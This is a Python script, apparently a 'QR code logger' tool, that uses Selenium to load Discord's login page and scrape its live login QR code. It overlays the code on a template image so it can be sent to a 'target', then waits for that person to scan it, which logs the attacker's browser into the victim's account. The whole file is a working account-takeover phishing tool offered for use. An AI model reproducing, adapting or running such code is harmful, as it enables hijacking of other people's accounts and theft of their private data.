from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os
import colorama
from colorama import Fore,Back
colorama.init()

def logo_qr():
    im1 = Image.open('Template/background.png', 'r')
    im2 = Image.open('Template/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('Start/_.png', quality=95)

def main():
    print(Fore.MAGENTA +
        '''
 ██████╗ ██████╗ █████╗  █████╗██████╗ ███████╗    ██╗      █████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██║     ██╔══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
██║██╗██║██████╔╝██║  ╚═╝██║  ██║██║  ██║█████╗    ██║     ██║  ██║██║  ██╗ ██║  ██╗ █████╗  ██████╔╝
╚██████╔╝██╔══██╗██║  ██╗██║  ██║██║  ██║██╔══╝    ██║     ██║  ██║██║  ╚██╗██║ ╚██╗██╔══╝  ██╔══██╗
 ╚═██╔═╝ ██║  ██║╚█████╔╝╚█████╔╝██████╔╝███████╗  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║ ██║
   ╚═╝   ╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚═════╝ ╚══════╝  ╚══════╝ ╚════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝ ╚═╝'''
        
        +Fore.RESET)

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Discord Login page has been loaded, & ready to use.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    background = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'Template/background.png')

    img_data =  base64.b64decode(background.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()

    print(Fore.GREEN+'- Qr code has been generated, File location Inside Of Start folder.'+Fore.RESET)
    
    print(Fore.GREEN+'_Waiting for target to scan qr code.'+Fore.RESET)

    while True:
        if discord_login != driver.current_url:
            print(Fore.RED+'_Successfuly Logged in_'+Fore.RESET)
            break
if __name__ == '__main__':
    main()